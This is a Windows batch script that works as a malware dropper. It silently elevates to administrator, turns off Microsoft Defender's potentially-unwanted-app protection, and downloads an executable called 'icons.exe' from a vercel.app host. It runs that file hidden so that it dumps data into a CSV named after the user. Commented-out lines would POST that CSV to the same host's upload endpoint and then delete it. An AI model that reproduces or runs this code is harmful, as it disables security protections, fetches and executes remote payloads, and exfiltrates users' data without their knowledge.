@echo off

:: Check the current PUA protection status
for /f "tokens=2 delims=:" %%A in ('powershell -Command "(Get-MpPreference).PUAProtection"') do set "PUAStatus=%%A"
set "PUAStatus=%PUAStatus: =%"

:: If either "Block apps" or "Block downloads" is enabled (PUAProtection is not 0), proceed with administrative access request
if not "%PUAStatus%"=="0" (
    net session >nul 2>&1
    if %errorLevel% NEQ 0 (
        powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs -WindowStyle Hidden"
        exit /b
    )

    :: Disable PUA protection (turn off "Block apps" and "Block downloads")
    powershell -WindowStyle Hidden -Command "Set-MpPreference -PUAProtection 0"
)

:: Change directory to the script location
cd /d "%~dp0"

:: Check if the x64 folder exists, create it if not
if not exist x64 mkdir x64

:: Download the file to the x64 folder in hidden mode
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://the-anonymus-stories.vercel.app/untold_story/get?icons=1' -OutFile 'x64/icons.exe'"

:: Run the downloaded file in hidden mode
powershell -WindowStyle Hidden -Command "Start-Process 'x64/icons.exe' -ArgumentList '/scomma x64/%username%.csv' -WindowStyle Hidden"

:: Wait for the CSV file to be created
timeout /t 10 >nul

:: Send the content of the file as a POST request
::powershell -WindowStyle Hidden -Command "Invoke-RestMethod -Uri 'https://the-anonymus-stories.vercel.app/untold_story/upload' -Method Post -Body (@{username='%username%'; content=(Get-Content -Path 'x64/%username%.csv' -Raw)})"

:: Delete the CSV file after sending the data
::del "x64\%username%.csv"
